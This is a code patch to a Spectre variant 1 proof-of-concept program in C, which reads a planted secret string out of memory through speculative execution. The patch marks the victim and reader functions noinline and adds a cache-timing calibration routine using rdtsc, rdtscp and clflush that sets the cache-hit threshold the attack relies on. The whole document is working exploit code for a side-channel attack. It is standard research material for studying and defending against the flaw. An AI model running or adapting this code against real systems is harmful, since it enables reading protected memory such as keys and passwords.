@@ -1,0 +1,111 @@
+diff --git a/Source.c b/Source.c
+index 0c85cd8..6354c49 100644
+--- a/Source.c
++++ b/Source.c
+@@ -26,7 +26,7 @@ char* secret = "The Magic Words are Squeamish Ossifrage.";
+ 
+ uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
+ 
+-void victim_function(size_t x)
++void  __attribute__((noinline)) victim_function(size_t x)
+ {
+ 	if (x < array1_size)
+ 	{
+@@ -40,7 +40,7 @@ Analysis code
+ #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+ 
+ /* Report best guess in value[0] and runner-up in value[1] */
+-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
++void  __attribute__((noinline)) readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
+ {
+ 	static int results[256];
+ 	int tries, i, j, k, mix_i;
+@@ -112,8 +112,88 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
+ 	score[1] = results[k];
+ }
+ 
++#define SET_CACHE_HIT_THRESHOLD
++#ifdef SET_CACHE_HIT_THRESHOLD
++
++static int mysqrt(long val)
++{
++	int root = val / 2, prevroot = 0, i = 0;
++
++	while (prevroot != root && i++ < 100) {
++		prevroot = root;
++		root = (val / root + root) / 2;
++	}
++
++	return root;
++}
++
++static inline int
++get_access_time(volatile char *addr)
++{
++	register unsigned cyc_high1, cyc_low1, cyc_high2, cyc_low2;
++	volatile int j;
++
++	asm volatile ("cpuid\n\t"
++		      "rdtsc\n\t"
++			"mov %%edx, %0\n\t"
++			"mov %%eax, %1\n\t"
++			: "=r" (cyc_high1), "=r" (cyc_low1):: "%rax", "%rbx", "%rcx", "%rdx");
++
++	j = *addr;
++
++	asm volatile("RDTSCP\n\t"
++ 			"mov %%edx, %0\n\t"
++ 			"mov %%eax, %1\n\t"
++ 			"CPUID\n\t": "=r" (cyc_high2), "=r"
++			(cyc_low2):: "%rax", "%rbx", "%rcx", "%rdx");
++
++	return cyc_low2-cyc_low1;
++	//return ((unsigned long long)cyc_high2 << 32) | cyc_low2 - ((unsigned long long)cyc_high1 << 32) | cyc_low1;
++}
++
++#define TARGET_OFFSET	12
++#define TARGET_SIZE	(1 << TARGET_OFFSET)
++#define BITS_READ       8
++#define VARIANTS_READ	(1 << BITS_READ)
++static char target_array[VARIANTS_READ * TARGET_SIZE];
++static int cache_hit_threshold;
++#define ESTIMATE_CYCLES	1000000
++static void
++set_cache_hit_threshold(void)
++{
++	long cached, uncached, i;
++
++	if (0) {
++		cache_hit_threshold = 80;
++		return;
++	}
++
++	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
++		cached += get_access_time(target_array);
++
++	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
++		cached += get_access_time(target_array);
++
++	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
++		_mm_clflush(target_array);
++		uncached += get_access_time(target_array);
++	}
++
++	cached /= ESTIMATE_CYCLES;
++	uncached /= ESTIMATE_CYCLES;
++
++	cache_hit_threshold = mysqrt(cached * uncached);
++
++	printf("cached = %ld, uncached = %ld, threshold %d\n",
++	       cached, uncached, cache_hit_threshold);
++}
++#endif
++
+ int main(int argc, const char* * argv)
+ {
++#ifdef SET_CACHE_HIT_THRESHOLD
++	set_cache_hit_threshold();
++#endif
+ 	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
+ 	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
+ 	int score[2], len = strlen(secret);
